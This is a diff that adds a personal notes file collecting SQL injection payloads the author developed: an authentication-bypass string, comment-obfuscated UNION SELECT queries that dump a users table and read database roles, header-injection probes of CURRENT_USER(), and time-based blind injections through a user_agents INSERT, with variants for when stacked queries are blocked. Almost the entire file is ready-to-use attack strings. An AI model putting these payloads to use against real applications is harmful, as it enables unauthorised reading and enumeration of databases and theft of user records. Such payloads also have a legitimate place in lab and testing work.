@@ -1,0 +1,19 @@
+/*************************\
+I figured I'd start documenting the various payloads I came up with to better document the development process and organise things a bit better
+/*************************\
+
+GET/POST
+'OR'1'='1
+'/**/UNION/**/SELECT*FROM/**/users/**/WHERE/**/id>'
+Use of functions in the query:
+'/**/UNION/**/SELECT'*','*',CURRENT_ROLE()FROM/**/users/**/WHERE/**/id>'
+
+HEADER INJECTION
+SELECT IF(STRCMP(CURRENT_USER(),'temp@%') = 0, 'YES', 'NO`');`
+SELECT IF(STRCMP(CURRENT_USER(),"temp@%") = 0, "YES", "NO + `');`
+INSERT INTO user_agents VALUES('mozilla'); SELECT IF(2>1, SLEEP(2), 'no`');` 
+
+NO MULTI-STATEMENTS:
+INSERT INTO user_agents VALUES('mozilla') UNION SELECT SLEEP('5
+
+INSERT INTO user_agents VALUES('mozilla'); SELECT IF(2>1, SLEEP(2), 'no');--`');`
